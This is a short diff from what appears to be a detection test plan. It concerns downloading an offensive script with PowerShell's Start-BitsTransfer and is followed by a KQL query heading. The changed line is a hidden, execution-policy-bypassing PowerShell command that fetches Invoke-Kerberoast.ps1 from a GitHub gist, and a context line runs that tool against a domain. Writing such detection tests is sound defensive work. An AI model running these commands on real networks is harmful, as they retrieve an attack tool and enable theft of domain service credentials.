@@ -15,7 +15,7 @@ Invoke-Kerberoast.ps1 -Domain contoso.com | fl
 
 Test plan for Start-BitsTransfer PowerShell cmdlet"
 
-"powershell.exe" -windowstyle hidden -ExecutionPolicy ByPass -NoProfile Start-BitsTransfer -Source https://gist.githubusercontent.com/0xbadjuju/0ebe02983273048c237a8b24633cee3f/raw/c385a21c230ee0e274293aa4e50b5b9ed4197df2/Invoke-Kerberoast.ps1 -Destination C:\Temp\Invoke-Kerberoast.ps1
+powershell.exe -windowstyle hidden -ExecutionPolicy ByPass -NoProfile Start-BitsTransfer -Source https://gist.githubusercontent.com/0xbadjuju/0ebe02983273048c237a8b24633cee3f/raw/c385a21c230ee0e274293aa4e50b5b9ed4197df2/Invoke-Kerberoast.ps1 -Destination C:\Temp\Invoke-Kerberoast.ps1
 
 
 KQL Query:
